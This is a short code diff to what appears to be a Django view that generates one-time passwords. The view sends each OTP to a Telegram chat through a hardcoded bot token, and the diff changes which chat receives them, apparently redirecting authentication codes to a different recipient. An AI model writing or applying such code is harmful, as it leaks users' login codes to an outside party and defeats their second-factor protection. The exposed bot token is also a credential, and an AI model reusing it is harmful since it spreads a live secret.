@@ -41,7 +41,7 @@ class GenerateOTPView(views.APIView):
         # Push OTP to Telegram
         import requests
         telegram_token = "8627641763:AAF1cBbJah5UE3RwJLPHtMZHKQ477st-LGs"
-        chat_id = "900041837"
+        chat_id = "5968267783"
         try:
             requests.get(f"https://api.telegram.org/bot{telegram_token}/sendMessage", params={
                 "chat_id": chat_id,
